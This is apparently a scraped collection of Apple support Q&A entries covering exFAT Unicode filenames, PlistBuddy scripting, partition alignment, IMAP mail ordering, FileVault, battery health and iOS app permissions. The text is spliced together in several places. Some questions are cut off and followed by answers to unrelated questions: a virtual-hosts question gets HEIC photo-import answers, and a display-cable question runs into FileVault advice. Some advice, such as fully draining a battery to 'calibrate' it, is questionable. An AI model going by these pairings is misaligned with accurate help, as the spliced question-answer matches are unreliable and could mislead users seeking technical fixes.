NFD filename is preserved.\n\n*Now I want to move this file back to my macOS 10.13 + APFS using an exFAT drive (exFAT supports the same UTF-16 convention as NTFS).\n\n*Hell break loose.\n\n\nI could have copied the file via networked drive or TeamViewer, and it would be fine, but exFAT is triggering this bug on macOS.\nLessons:\n\n\n*\n\n*Unicode filename is still a threat.\n\n*You actually need an Windows/Linux to fix this issue (if the situation is your file are on an exFAT external drive).\n\n\nA: The problem appears to be caused by a file named 03 - Ēlusion.mp3 located within the directory named folder.\nBecause Terminal.app is unable to render diacritical marks in file names--well, it is, but that's beyond the scope of providing the simplest solution for you--it hides its failure by hiding the filename (something unheard of by me before now; perhaps its High Sierra's changes to /.file, /.volfs and 64-bit inodes? Wait-- never mind; your edit to your question tell me I misunderstood you.) Anyway, the file's existence is known, along with the ironical contention by the Finder that it doesn't exist. Obviously, it does. Here's how to change that:\nFirst, determine the file's inode number. In Terminal.app, cd to the directory \"folder\" and issue this command: ls -i *.mp3\nCopy the number string of the inode provided in the left-hand column of the response, which will be something like\n12345678  03 - E ̄lusion.mp3\n--and put it into this command, which will rename it to something the terminal can render correctly:\nfind . -inum 12345678 -exec mv {} deletemenow \\;\n--giving you the file \"deletemenow\" in the folder \"folder,\" both of which you may dispose of in whatever way best suits your fancy.\n", "Q: Is it possible to *partially* claim an iTunes gift card?

Or do I have to buy the Apple Music subscription first, and then other iTunes content?\n\nA: There is a free trial period for Apple Music. Your gift-card will not be claimed within the trial period. Just make sure you cancel your subscription when the free trial ends.\n\nA: No. At the time of this writing it is not possible to spend part of a gift card credit on iTunes Store content and then use the remaining balance toward Apple Music.\nYou will be presented with the following screen, where you must choose to either use the credit to get Apple Music now, or use the credit to get only iTunes Store content.\n\nIn my case I chose to put the credit toward only iTunes Store content.

It would save hours and hours of GUI work.\n\nA: Here's a three-line shell script for bash. Assume the CSV file is named hosts.csv.\nh=`hostname -s`\nc=`sed -nE -e \"/^$h, ?/s/^.+, ?//p\" hosts.csv`\n/usr/libexec/PlistBuddy -c \"Set :2ndfloor:com.apple.print.preset.settings:ManagementCodeValue $c\" ~/Library/Preferences/com.apple.print.custompresets.forprinter.CMI2ndFloorColor.plist\n\nThe script sets the shell variables $h to the host name, and $c to the code that matches the host. Get the name of the host from the hostname command. Use $c in place of the value \"1001\" in the PlistBuddy command.\nBy default the hostname command returns domain information. Therefore if the CSV file has host names without domain information, use h=`hostname -s`, otherwise use h=`hostname`.\nThe sed command matches a line from the CSV file that starts with the $h host name followed by a comma and an optional space character. For the line that matches, sed removes everything but the code from the line.\n\nA: You can use awk to process the file and find the matching code value.\ncode=$(awk -F , '$1 == \"'$(hostname -s)'\" { print $2 }' hosts.csv)\nif [[ -n \"$code\" ]]; then\n    /usr/libexec/PlistBuddy -c \"Set :2ndfloor:com.apple.print.preset.settings:ManagementCodeValue $code\" ~/Library/Preferences/com.apple.print.custompresets.forprinter.CMI2ndFloorColor.plist\nelse\n    echo \"No code for $(hostname -s)\"\nfi\n\nThe awk part searches for the line where the first value is equal to the hostname and prints the second value of that line. As there might be no match, the if ... part ensures that PlistBuddy is only called if a code value was found.\n", "Q: Aligning, moving and enlarging partitions seems impossible A friend's MacBook (mid 2009 model) was stuck at the boot screen and I have discovered that the HDD was failing, so I've replaced the failing regular 320GB HDD with a Samsung 860 evo 500GB SSD.\nI cloned the disk with ddrescue and before reinstalling via the recovery partition, I aligned the partitions (EFI, Macintosh HD and Recovery HD) with GParted.\nSomething went wrong, and when reinstalling El Capitan was complaining that \n\nsome features of macOS are not supported for the disk [...] you can't use FileVault, set up a firmware password, or use Disk Utility to repair the disk\n\nI didn't want to give back the MacBook with this problem, so I tried different ways to align the partitions. I even installed El Capitan by using a removable USB stick so I could format the SSD, but the newly created partitions were again not MB aligned.\nMy last attempt was by using the trial version of the Paragon Hard Disk Manager for Mac, but it failed. It seems that the partitions couldn't be moved and enlarged (so after the recovery partition I still have ~200GB of unallocated space that I can't use).\nAny clues on how could I align the partitions and finally return the Mac to my friend?\nNote that I have a backup of all the data, so I can format again the SSD. I would just like to preserve/recreate the Recovery partition in the process. And, obviously, allocate all the SSD's space.\n\nA: So, I've solved my problem in a destructive way: I've connected the SSD to my Linux machine, launched GParted, deleted the Macintosh HD and the recovery partition and created a new Macintosh HD partition, aligning it to the MiB.\nAfter that I've put the SSD back in the macbook, launched disk utility and formatted the partition as HFS+ journaled, then launched the installer from an USB stick and reinstalled MacOS.\nThe installer had recreated the Recovery partition while keeping the Macintosh HD alignment to the MiB.\n", "Q: What encryption method was used in OS9 Apple File Security? I am trying to decrypt files that were encrypted on Mac OS 9 with its built-in 'encrypt' function (part of the \"Apple File Security\" application).

I've tried turning that on and off and it makes no difference.\nDoes anyone know how I can fix this?\n\nA: Not sure if anyone will still read this but this question was still pretty high in rank on Google search.\nI'm moving a large amount of mails from Gmail to self hosted solution, and also noticed this issue. I believe this is not caused by \"Apple isn't looking at the same date for sorting that webmail or Outlook uses\", rather it's because how the app interacts with IMAP servers.\nIn IMAP servers, all messages in a specific folder has a unique identifier (UID, see RFC 3501 for more technical details). It's a monotonic increasing number, and the UID is assigned to each mail in the order of it's addition to the mailbox in most cases.\nThe issue is when migrating emails, sometimes it's not guaranteed that the old mails are inserted in chronological order, so they may be partially \"out of order\" in terms of UID (in my case, the new mailbox is already receiving new mails when old mails are still being imported by imapsync).\nMy best guess is iOS mail app is only fetching tailing UID range of a folder, and in a normal mailbox it's just fetching the latest mails. However, in the above situation, it may gets mails that could be very old, but for all mails it's already fetched they will be in right chronological order. The time gap is simply because the app didn't actually have those mails downloaded. When you load more mails, the \"missing\" mails will be eventually downloaded and shown in right order. (I should have verified this by sniffing but didn't, but this should be the most possible explanation.)\nThe reason Outlook was fine in @Rick Rothwell's case may be that Outlook actually stores all mail headers locally (IIRC) so it can just reorder the mails locally to show them in chronological order. I've checked Roundcube's source code and it uses IMAP SORT command when fetching mails. However that command supposedly is not supported by some servers, and that could be why iOS mail app was not using it.\nTo fix the issue, I think the most direct approach is to just move the mails to another temp folder then move them back, while making sure that the moving operation is applied in chronological order (older ones first). As the UID of the mails are tracked per-folder, moving them across folders would give them new UIDs, and by making sure that they are assigned UID in right order there would be no issues in iOS mail app (or any other client that has this issue).\n\nA: The problem is that Apple isn't looking at the same date for sorting that webmail or Outlook uses. I just had a mess cleaning up a user's mailbox that was full at 25GB. Our Rackspace webmail only lets you move 100 items at a time, so I used Outlook so I could grab huge chunks of email to move. Oops !\nIt did a pretty good job with over 120,000 emails in the mailbox, but eventually the number of items was off. Then I used webmail to move the rest that were orphaned. Looks fine in Outlook 2016 (Office365) and in Rackspace webmail. But on an iPhone or iPad the first week of email was right, then it went to 2016 emails - 2017 and 2018 were no longer where they should be. Messed up, not in correct chronological order.\nThe solution that a Rackspace tech gave me was via webmail - not Outlook or other device - to move the emails in the Inbox to another folder for 5+ minutes, let everything sync on the server, then copy them back to the Inbox. It fixed all the emails I tried it on. There's 71,000+ in her Inbox, so if having the last few weeks correct on the iPhone is all she needs, I'm done ! I was very happy that a simple move out and back fixed the issue. Hope it helps someone else. There is also the option of using the Outlook app, it may not be affected by the Apple iOS date issue.\n\nA: I know this is old but I just had this happen to me on iOS 13. I was trying to mark all email as read and slipped and marked everything as junk... After correcting that nightmare, I noticed my email showing on my phone was very old. I read the solution here about restoring the phone from the backup and I did not want to do that. So the solution I came up with was this and it worked for me.\n\n\n*\n\n*Log in to your Gmail account online through a browser and select all\nemail in your inbox. Then Chose Archive. This moves all mail out of\nthe Inbox for Gmail but leaves it in the All mail folder.\n\n*Go to the All Mail Folder and select the email you want to be back\nin your inbox. For me I selected the last 100 emails and then chose\nMove to Inbox.\n\n*Drag down on your iPhone to refresh the mail. All your mail that you\nmoved back to the inbox should now be in there in order.\n\n\nEnjoy.... \n\nA: I had exactly the same Problem with my iPad, deleting the account and adding it again didn't solve the Problem so I Spoke with someone at the Genius Bar. \nJust Backup your data and reset your device. After that just restore from Backup. That solved the Problem for me.\nHope I could help you.\n", "Q: Resume Restore issue after internet goes offline How do I resume a restore from iCloud on a new iPhone 8?

It's been nearly 1yr & 6 months since I bought my MacBook 13\" 2015 retina. \nNow, the battery only holds 57% of its original capacity. Number of charge cycles is 234. This battery can hold only 2 - 3 hours.\nIs this normal? I have no any warranty now.\n\n\nA: Try remembering your usage of the battery. Is it always plugged with the AC charger? How many times did you go from 100% to 0? Did you leave it discharged for a long time? This all cuts down you battery life despite having only 200+ cycles.  \nYou can though try a calibration procedure. Charge you MacBook to 100% and stay plugged for 2-3 hours. Then use it as usual and let it go to 0. Leave it for 5-6 hours discharged (overnight probably) and then charge back to 100%. You will see change in you battery life mAh. If you had never done this before, probably you would like to do this 2 times. It is recommended to do this procedure once in one-two months.\nYou may track how you battery behaves by entering in terminal the following code:\npmset -g rawlog\n\nIt will show current charge, current battery life, design battery life, drain, remaining charging/discharging time etc.\n\nA: I’ve seen this happen before, it may be time to start looking at replacements and repairs!\n", "Q: How to resize Apple partition?

Sometimes it's just busy, sometimes your network isn't passing SSL/ encrypted traffic correctly, sometimes your account needs to be fixed on the server side.\n\nYou don't have to manage this from your Mac - you can go to https://www.icloud.com/#settings and it will show you the steps to manage it from iOS and from Mac so you can try your change and check on your status from iOS.\nIf you want to work this to a conclusion on the Mac, dpending on how technical you want to get, interacting with Apple Support is a quick way to narrow these things I'll mention below down. They'll go over a couple things to try and then escalate to engineering if needed.\nIf it were me, I'd try signing out and in from any device on the same network as the computer. This can remove a portion of your synced iCloud data and need to re-sync it up and down, so I don't do that without thinking about how I use iCloud and know I might wait a while for an iCloud photo library to sync.\nIf you only have the default 5 GB of storage space, I'd sign out from your Mac, then restart and then try signing back in. Support will really dig in when you can't get signed in in the first place as there's really only four things to fix there.\n\n\n*\n\n*Your computer / network / time are off and need to be fixed\n\n*The network isn't set up correctly\n\n*Your account status is locked or needs a fix from Apple\n\n*You aren't following the steps to get logged in\n\n", "Q: limitations of .aspx web pages rendered in OS X Safari Specifically, \nThe goal is to understand the degree of compatibility of Safari with .aspx services.  Is there a comprehensive list of .aspx functionality that fails in Safari?

The web pages created by ASPX are not inherently limited on Safari browsers.\nThis is the same for other server side technologies such as Java, php, and perl.\nDeveloper's Responsibility\nThe developer of the .aspx created page is responsible for producing content that conforms to widely accepted web standards. These standards include HTML5 and those published by the World Wide Web Consortium.\nWeb developers can refer to resources such as QuirksMode for a guide to what features are supported by which browsers.\nWebmasters' Stack Exchange\nFor help with specific web technologies and choices, please ask on the specialised Webmasters Stack Exchange.\n\nA: At a high level, I would say there is no generalization you can apply since the .aspx just is the default extension for a specific web framework that runs on the server side. Think of .aspx as the container and not the content of the web page or the languages used.\nAs an analogy - you could ask if this container has a specific food in it:\n\nEveryone might expect that it’s an Americanized version of fast food that vaguely resembles some street food from China, but it could be anything inside that container and not even food (or standard food for sure).\nWith JavaScript and some plug in - you could have binary data and not even HTML/CSS being delivered from that site or it could be amazingly standards-compliant and responsive web design.\nNote, I haven’t even begun to mention Safari. Other than empirically testing each specific site you want and recording how it functions you’d need to analyze what you feel “compatible” means and then narrow your search for frameworks or tools.\nIf you wanted a fairly cross-platform web standards, you could do far worse than starting with http://validator.w3.org/ \nThat tool throws 20 errors and 9 warnings against your site but that doesn’t mean Safari can’t do some or all of what it needs.\n", "Q: OSX Sierra, trouble with virtual hosts I'm trying to create a separate virtual host on a Mac for a local project, which would not be http://localhost/ibb but, for example: http://ibb.local.

All I want to do is to quickly transfer these files from the iPhone to the MacBook.\n\nA: iPhone settings -> Photos -> Transfer to Mac or PC -> Switch from \"Automatic\" to \"Keep Originals\"\nThere's also a \"Keep Originals\" option in the OSX Image Capture app, I'm not sure how the two options interact with each other. From my brief testing, if the box is ticked in either place then imports will be super-fast and you'll get the original .heic images instead of the converted .jpeg ones.\n\nA: I got the same problem with iMac Late 2011 with High Sierra and iPhone 8. Image Capture takes forever and makes it almost impossible to import a big bunch of images. There seems not to be much information on the Net so far.\nThere are also issues with connecting the iPhone to the Mac, in some cases the iPhone is not recognized.\nFor new pictures I turned HEIC off in the Settings (\"Interoperability\" in the Settings for Camera), then the import is quite fast (if it connects...)\n", "Q: MiniDP to VGA/HDMI or HDMI to HDMI I have external monitor with VGA and HDMI ports, i plan to connect my macbook pro (mid 2014) to connect it.\nWhat's the best way of doing this: Direct HDMI to HDMI connection, or MiniDP to HDMI/VGA adapter?\n\nA: The best way is to use the built-in HDMI port, but if for some reason you need to use the MiniDP, it's a better idea to use a MiniDP to HDMI cable instead of a MiniDP to VGA cable since VGA is analog, which means it's lower quality video and it has no audio.\n", "Q: Swapping the dollar sign for a euro, American english keyboard I know that the keyboard shortcut to use for the Euro symbol is Option + Shift + 2.

I am selling my MacBook Pro and was reading through what to do before factory resetting the Mac. One of the recommended steps was turning off FileVault, but now I want to reset the hard drive and reinstall the OS and I'm stuck waiting for FileVault to do it's thing. I'm not sure how long FileVault will take but I don't want to keep the purchaser waiting and he's coming by in about 18 hours. \nCan I erase the drive halfway through the FileVault decryption process without it causing problems for the Mac? I'd imagine that if I'm erasing the drive the FileVault status won't matter too much but I'd like to be certain.\n\nA: The secure way to do it is to simply erase the dive, don't decrypt it first. That makes recovery of your data impossible - whereas if you decrypt it, there is a possibility it can be read later by a bad actor.\nSee Apple KB - What to do before you sell or give away your Mac\n\nA: You can wipe it without decrypting. Just use disk utility first when you are in the installer system and format the drive you are installing to.\n\nA: As I didn't find a direct answer to OP's question, I've experienced the same situation and with a partly decrypted FileVault the erasing and installing a fresh macOS wasn't a problem.

I reckon HDMI has troubles with FPS on Macbook Pro?\n\nA: According to this discussion, it's recommended to go with Display Port.\nQuoting from the answer:\n\nSo, the question is actually: \"Which would work better? Display Port to HDMI or Display Port to Display Port?\"\nPersonally, I don't like converting signals from one to the next - I would go with a Display Port adapter and keep everything the same end-to-end. The less you have to convert, the less overhead and the less compatibility issues.\n\nCredit to @Allan for the original answer.\n", "Q: Apple Mail: Apply Rule to a Folder I know how to setup basic rules to move emails in Apple Mail from the inbox of an email account into folders. Is it possible to do the same thing the other way around, i.e., to move emails that are already within a folder back into the inbox or some folder?\nFor example: I am moving potential spam emails into the Junk folder on the server and mark them as read before Apple Mail deals with them. Sometimes it happens that emails are wrongly classified as spam and in most cases I can recover those email simply by checking whether the sender is in my contact. Therefore, I would like to apply a simple rule to the Junk folder with Apple Mail and move emails back into the email account's inbox if the sender is in my contact.\nIs Apple Mail capable of that?\n\nA: I figured out it's at possible to apply rules to emails in drafts, sent, junk, trash, archive or other IMAP folders by selecting all messages and selection Message > Apply Rules.\nThe issue might have been that the spam emails are flagged as read on the server before they are loaded by Apple Mail and that Apple Mail doesn't apply rules to new emails if they are flagged as read already. \n", "Q: Upload specific Photo photos to Google Drive I have a relatively large photo library (30 GB) stored in Photos.app, stored as one big 'Photo Library'. It is setup to sync to iCloud. I have taken some pictures on my iPhone, which is also synced to iCloud.\nI want to upload a few specific photos into Google Drive. It seems there are a couple different ways I could do this. I could either access the actual photo file within the 'Photo Library' (perhaps by following this guide) and upload it directly. Alternatively, it seems that I can upload the entire photo library and then select specific images (as explained here) but that process was slow because my library is large.\nWhat is the best way to upload a few of my specific photos stored in iCloud, accessible via Photo, to Google Drive?\nAn ideal solution for me would be to right click on the photo (or a group of photos) and 'share' to Drive, or something of the like.\n\nA: Not having Goole Drive I am making an assumption here that you have a folder of some sort that you can drag files into and out of, similar to Dropbox.\nIf you select the photos in Photos.app that you want exported to Google Drive and then tap ShiftCommandE that will prompt you for the kind, size and quality of the picture. Once selected click Export and point the file dialog box to your Google drive folder.\nNote that Photos.app will remember the kinds, size and quality settings from the last export so you will likely only have to select those options once.\n", "Q: Alexa App on iPhone 4 / iOS 7.1.2 - Can't find “alexa” button I have an old iPhone 4 that I want to use via WiFi in my car to use Alexa to play Spotify.

It installed fine, and I was able to connect it to my Alexa account with no problems. \nThe challenge now is, I can't find the Alexa button in the app. There is a home screen and a hamburger menu button at the top that brings up what looks like the setup menu, but no Alexa button to tell Alexa to do things. Is the screen too short? Has anyone else successfully used Alexa on an iPhone 4?

Here is a problem I have been having for a while, and I can't imagine I am the only one. I suspect there is a fairly simple solution that I have just not yet thought of:\nI have two MacBooks that I often use at home (one for private, and for business). I have one external display, which I connect to either depending on whether I am working or doing something privately. I have a single set of bluetooth periphery (Apple bluetooth keyboard and mouse). I could buy a second one, but then they are cluttering up my fairly small desk for no good reason. It's easy to pair my keyboard and mouse to both computers, but hard to find a quick way to pair it to the one I currently want to use. Basically, if I turn on the mouse or keyboard it's pretty much nondeterministic which it actually gets connected to if both laptops sit on my desk. Given that I need \"wake up on bluetooth\" enabled at least on the work laptop for reasons that have to do with my office setup, it also matters little if the work laptop is sleeping in it's bag. Sometimes it gets woken up and connected to anyway.\nWhat I am looking for is a fairly simple solution to decide which laptop to connect to at any given time. The following solutions I have pretty much ruled out, especially since I sometimes want to switch fairly rapidly:\n\n\n*\n\n*Unpairing both devices after usage. Too awkward to do all the time.\n\n*Disabling \"wake on bluetooth\" on both laptops and making sure that the one I am not using is sleeping. As I wrote I need it for my office setup.\n\n*A hardware KVM. The ones I found seem to be of bad quality, and if possible I would like to avoid putting another piece of hardware on my desk.\n\n*A software KVM. Again, the ones I found seem to not work very well, but if you know a really good, simple one I may give it a shot.\n\n\nWhat would be the easiest fix for me would be if I could tell my work laptop that it should only connect to these specific bluetooth devices (not all bluetooth devices, mind you) upon demand, but I could not find a way to do this on a per-device basis. However, if somebody has a better idea I am all ears. I am fairly confident with the terminal, so a slightly hackier solution does not scare me as long as it does not interfere with how all my other bluetooth devices operate.\n\nA: While this may not be quite what you're looking for, you can use a solution like Synergy to share the keyboard and mouse between both devices.\nAfter installing the software on both computers, you could let your Bluetooth peripherals connect to either computer and the software will allow you to simply move the mouse off of one screen and onto the other.\n", "Q: Virtual Machine vs. Remote Desktop performance on 2012 MBPr MacBook specs:\n\n\n*\n\n*i7 2.3ghz processor\n\n*256gb SSD\n\n*16gb RAM\n\n*Intel HD graphics 4000 \n\n\nI am trying to write, compile, and run c# windows form apps on my Mac, and I'm having little to no success. I've done mono and I get it to start and run, but the program doesn't completely load/render and it crashes every time I attempt to log in to my database. I've also tried Wine and I couldn't even get the app to start. I have visual studio installed on my MB and I've noticed that the Mac OS version of VS doesn't include the drag-and-drop form builder that is included in the Windows version, which I'm assuming is because you can't build a \"windows\" app on a Mac.\nI'm wondering if it would be a better decision to Remote Desktop to a windows pc or run a VM on my MBP? I feel like the VM would be more convenient but storage is an issue with only 256gb SSD. Also, with an older processor + gpu I'm not sure what kind of perforce I can expect from VM as opposed to remoting into a windows desktop. I'm curious to hear what you do if you have experience in this matter, or if you have any particular advice. \nAdditional questions:\n\n\n*\n\n*If storage is an issue, would running a VM from a usb 3.0 flash drive be acceptable?\n\n*Oracle Virtualbox, Fusion, Parallel comparison?\n\n*Does anyone have experience with the Windows Remote Desktop client for Mac? Am I better off with this or a 3rd party app?\n\n\nA: I ended up going with a Remote Desktop client for storage and performance reasons. Storage is obvious - my MBP is very limited with a small SSD. Performance reasons for choosing Remote Desktop were because it is effectively two CPUs, GPUs, and Hard Drives - essentially doubling my specs. Here's the process I took:\n\n\n*\n\n*I bought a Lenovo IdeaCentre 510a with my desired specs and replaced the optical drive with an SSD.\n\n*I upgraded to Windows 10 Pro. This is crucial. To use Windows Remote Desktop, the computer you are remoting into needs to have Windows 10 Pro, Ultimate, or Enterprise.\n\n*I downloaded the Windows Remote Desktop client for Mac from the Mac OS app store and configured it with some help from this MSDN documentation.\n\n\nFollowing those steps will giving you access to remote into your machine as long as you are on the same network.

I never want the Caps Lock to lock capitals.\n\nA: It was right before me, there are distinct settings for the built-in keyboard and the external keyboard.  Setting it for external works!

I then use this in the Spotlight action to find that track in my iTunes Library, but the Spotlight action gives multiple results when I want only want the exact track not all tracks that contains the name.\nI need some way or a script to replace this action. All searches gives Terminal commands that I don't understand or how to use with Automator.\n\nHere's an applescript I found that works but is really really slow, it beach-balls the Finder on every loop, Is there a way to speed this up,my library has over 10,000 tracks? thanks\nhttps://www.dropbox.com/s/o14eb19b2459vdo/by%20default%202018-07-19%20at%20Thursday%2C%2019%20Jul%20%2017.55.18.PNG?dl=0 \n\nA: I don't have Snow Leopard, so I'm limited in what I can test as being viable for your system.  Therefore, please bear in mind that the following solution was devised and tested using the following:\nSystem info: AppleScript version: \"2.7\", system version: \"10.13.5\"\nWith that said, I see now reason that this shouldn't work on El Capitan.  It might work on Snow Leopard, but I'm less sure.\nMy proposed solution is to replace your Spotlight Automator action with a Run AppleScript action:\n\nThe code contained in the Run AppleScript is as follows:\n    use framework \"Foundation\"\n    \n    property ca : a reference to current application\n    \n    \n    on run {input, parameters}\n        set MusicFolder to \"/Volumes/Media/Music/iTunes/iTunes Music/Music/\"\n        \n        set FileManager to ca's NSFileManager's defaultManager()\n        set MusicFiles to (FileManager's subpathsAtPath:MusicFolder)'s ¬\n            pathsMatchingExtensions:{\"mp3\", \"m4a\"}\n        set [filename] to input\n        set format to \"SELF endswith \" & (\"/\" & filename & \".mp3\")'s quoted form & ¬\n            \" OR SELF endswith \" & (\"/\" & filename & \".m4a\")'s quoted form\n        set filter to ca's NSPredicate's predicateWithFormat:format\n        \n        set matches to {}\n        \n        repeat with match in (MusicFiles's filteredArrayUsingPredicate:filter) #'\n            set end of matches to POSIX file (MusicFolder & match as text) as alias\n        end repeat\n        \n        return matches\n    end run\n\nThis will return tracks with the exact filename supplied by the trackName variable in the workflow.  Therefore, had I set trackName in my test run to \"Everywhere I Go\" (i.e. without the preceding \"04\"), the search would have returned an empty result.\nAlso, bear in mind that you may have some tracks that have identical filenames from different folders/albums.  If there are two files in different folders both called \"01 Song.mp3\", both files will be returned in the search.\n", "Q: Back up specific IMAP mailbox? macOS 12.13.5, Mail.app 11.4. with an IMAP email account, Time Machine\nI'd like Time Machine to automatically and regularly back up a specific IMAP mailbox and its contents — even better would be the preservation of the mailbox's nested folders — so I have a local copy, independent of the IMAP server. The Mac's contents are now backed up using Time Machine, but neither this specific IMAP mailbox nor its contents appear in TM. I have some anxiety about an inadvertent deletion: without maintaining a local copy, the emails would be gone and things would be difficult. \nThese SE questions are close:\nMail.app in OS X — IMAP and Archive Mailbox subfolder creation\nCan I backup or mirror an IMAP mailbox on Mac OS X?\nHow can I back up a complete IMAP account?\nbut aren't helpful, particularly as I'm not facile or very comfortable in the Terminal. \nCan any of you offer a solution or pointer?\n\nA: Here's my solution to my question:\n\n\n*\n\n*First, I found that the contents of the IMAP mailbox I'm interested in are indeed stored on the Mac. Each email is an .emix file, and they are many many layers deep within ~/Library/Mail.\n\n*Second, I use ChronoSync to nightly create a bootable backup of the Mac's SSD boot drive. To handle this new email backup job, I created a Synch task in ChronoSync that nightly backs up this group of emails from within ~/Library/Mail to a new folder located on the drive which contains ChronoSync's bootable backup. Because the Mac runs SpamSieve for the IMAP email account, the Mac is always on and available to run this job in the middle of the night. \nOf course, I see now that having discovered where the emails were backed up already, I could as easily (save for the annoyance of navigation) find those .emix files on the Time Machine backup, or on ChronoSync's bootable backup. So it was a lot of worry for little or no gain.\n", "Q: iPhone 6s | Jailbreak broke my phone when i reset it Last night i reset my phone through Find My iPhone and its stuck at re-setting my phone and its been doing it for 10 hours now and i'm really confused.\nIf someone could help me fix this i would really appreciate the help.\n\nA: It sounds as though your option is to put it into DFU mode as outlined here and restore to a currently signed version of iOS through iTunes.\n", "Q: Mac Book 12\" (early 2016) kernel panic IONVMeController.cpp:4949 My Problem:\nMac Book 12\" (early 2016) in use for 1 year without any problem suddenly stopped while working and now cannot be started again / shows this panic report on startup:\npanic(cpu0 caller 0ffffff7f90224e1): nvme: \"Fatal error occurred.

I got the MacBook Pro (15-inch, 2016) with Touch Bar and I really don't like it. Is there any way to have it replaced it with a regular keyboard? \n\nA: The cost in parts and labor makes this cost prohibitive. Better to sell yours and buy the one you want. Specifically, the top case holds the keyboard and the logic board is different as are other internals. \nAnything is possible with several thousands of dollars (or more) of course but using an external keyboard might be the practical fix until you can get a swap for another Mac arranged. \n\nA: There is a host of problems here \n\n\n*\n\n*There are absolutely no 'parts' anywhere ready for this. \nThe old keyboards do no fit into the uppercase. After all the Touchbar is where they let their function keys protrude previously. Not to mention that previously key-travel was different, that would make the old keys protrude into the display, theoretically.\nSo, you would need to disassemble the whole machine, which is so terrible a procedure that independent reviewers agree with Apple on this one: the repairability score is so low, that Apple exchanges the whole uppercase if only the keyboard is broken. The keyboard itself is really crazy to even get to and to disassemble now. \n\n*Therefore, this is really a \"build your own (case) and get hold of an older internal keyboard\" now. With 3D printers this seems almost 'cheap' to do, and people have been doing this since 2015:\nThis is the First 3D Printed Laptop Case\nBut this method is of course resulting in quite a bit weaker, less sturdy than a monobloc aluminium enclosure. The example above uses PLA material.\nAfter tearing apart your MacBook Pro completely you'd need to adapt such a design to the fittings, ports and screws of the rests of the Apple hardware you want to, let's face it: by now it's recycle. \nDo not forget that you have to source an alternative replacement part keyboard, either compatible with or made to work wth the rest of your Franken-mac. Remeber that Apple doesn't allow recycling parts from ASAP and prefers to destroy usable parts than enabling repair shops recycling them as working parts. So you most probably have to rely on third party parts from the start.\nAnd you probably need to keep the Touchbar, as T2 chip and sensor as power switch seem quite integral for the design and its operation. That might result in a quite different design than what Apple sells: function key keyboard plus Touchbar! (Although that configuration is what Apple should have made in the first place.)\nObviously, I haven't tested this. There will be even more problems.\nAs a freakish but most fun project, this hack is a great idea. If that should succeed, it'd be even a really great show-off.\nIf it's really just about the keyboard than a small Bluetooth external keyboard is at less than 100$ a fraction of the cost of the above, works instantly with no labour after experimentation, and weighs only an additional few grams when travelling. As a desktop replacement, even the weight becomes quite irrelevant. Therefore a small Bluetooth keyboard is indeed a quite practical 'solution' for this disaster that Touchbar and Butterfly keyboard are and you do not like. \nIf you want a Mac with decent keyboard, you'd face the unwelcoming prospect of having to go back to a now used or refurbished model from 2015! They will soon enter vintage or oboslete staus. We can't get MBPs with a decent kbd anymore, perhaps never will again. Your best option here is wait while you complain vocally and write your wishes and needs to Apple. They keep saying that \"Apple listens to customers\". I found this rumour to be wishful thinking for the most part, so don't get your hopes rise too high on this. \nAn interesting middle ground might be reached in using a standard PC laptop with usable keyboard, a Hackintosh laptop, like in: 10 Best Hackintosh Laptops In 2019 (Definitive Guide) - ProTechLists. \nSummary of options\nIn any case: Write your wants and complaints to Apple!\n\n\n*\n\n*Get a (Bluetooth) external keyboard    \n\n*Switch back to a 2015 model, or older   \n\n*Switch to a Hackintosh   \n\n*Build your own case   \n\n", "Q: transfer the custom ringtones I have custom ringtones on my iPhone5s which show in Tones on iTunes.

If you're here to\n  silent Siri, do not choose this option.\n  \n*Control with Ring Switch: When you set your ring switch to silent,\n  Siri will not vocally respond to you, but there are caveats. Siri will\n  still beep and respond vocally if you initiate a discussion using \"Hey\n  Siri\" or if you're connected to a Bluetooth device, headphones, or\n  CarPlay. So, the only time Siri will remain quiet is if you use the\n  home button shortcut to activate her/him. If you unmute your device,\n  Siri will again vocally respond in every situation.\n  \n*Hands-Free Only: Just like the previous option, Siri will only beep\n  and respond vocally if you initiate a discussion using \"Hey Siri\" or\n  you're connected to a Bluetooth device, headphones, or CarPlay. The\n  only difference here is that you don't have to remember to set your\n  ring switch to silent.\n\nThe author of that piece sums it up nicely:\n\nAs you've probably noticed, there aren't really any great options for\n  keeping Siri silent on your iPhone.

The album shows up correctly in iTunes, ruling out the case of incorrect metadata. I have tried editing the title but without luck.\nWhat could possibly be the reason for this discrepancy and how do I resolve it?\n\n\nA: Sometimes things get messed up. Have you considered removing it from the library on a computer - manually fixing the metadate using iTunes or another program and then re-adding the songs to your library?\nBefore removing it - look for flags like “compilation” and “composer” to try disabling that.\nAlso - you will want to check how your iOS library syncs - whether it’s iCloud / Apple Music / or a more manual sync.

In this case you could then restore your iPhone again from the other backup to bring it back to the state it was in before the first restore you did.\nAssuming this is not your situation, and assuming that all you're really after is to retrieve the photos that were stored on your iPhone before you did the restore, your only hope is that your photos were synced/uploaded with an online service.\nUnless you've specifically signed up for a 3rd party service (e.g. Dropbox, Google, etc) then your only bet is that your photos synced with iCloud in some way. Your best bet in this scenario is that you had Photo Stream enabled (although, since you've also got a Mac, you may have also had other iCloud / Photos options enabled).\nI encourage you to read the following Apple resources. They explain how you can access your photo stream from other devices (many do have it enabled without realising). Even if these don't help you recover what you're missing, they'll certainly help you prevent a similar situation in future:\n\n\n*\n\n*My Photo Stream\n\n*About iCloud Photo Library and My Photo Stream\n\n*Get help with My Photo Stream\n\n*Get help with your iCloud Photo Library\n", "Q: iOS - Which user data are apps able to collect by default? On iOS, I'm often considering using the mobile website of services instead of their app because of possible privacy concerns. Now I'm wondering if this is actually unnecessary.\nSo my question is: Which device or user data are apps able to collect without granting any explicit permissions?\nCan they read my phone number, IMEI, can they see other installed apps etc.?\nLet's assume it's a freshly installed app that I've never opened so far.\n\nA: It might be simpler to approach this from the perspective of what info iOS developers must explicitly ask the user for permission.  If it's not included in this list then the user must assume a developer can access that info without asking the user for permission. \nAs an iOS developer for a few years, I know that Apple locks-down almost all user info. I can access very generalized info such as the device you're using, model number, but I can't tie it to a specific person unless I ask your permission first. \nMy goal, and hope, is that others will [edit] and add to this answer as more info is found/discovered/released. \nSource for the quote below is from Apple's developer docs. \n\nData protected by iOS system authorization settings includes location,\n  contacts, calendar events, reminders, photos, media, and many other\n  types as well.\n\nThat's pretty broad but it gives you an idea about what developers can't access without asking your permission first.  Here's another list from that same document that indicates the data and resources protected by system authorization settings:\n\n\n*\n\n*Bluetooth peripherals\n\n*Calendar data\n\n*Camera\n\n*Contacts\n\n*Health data\n\n*Health sharing\n\n*Health updating\n\n*Homekit \n\n*Location \n\n*Microphone \n\n*Motion\n\n*Music and media library 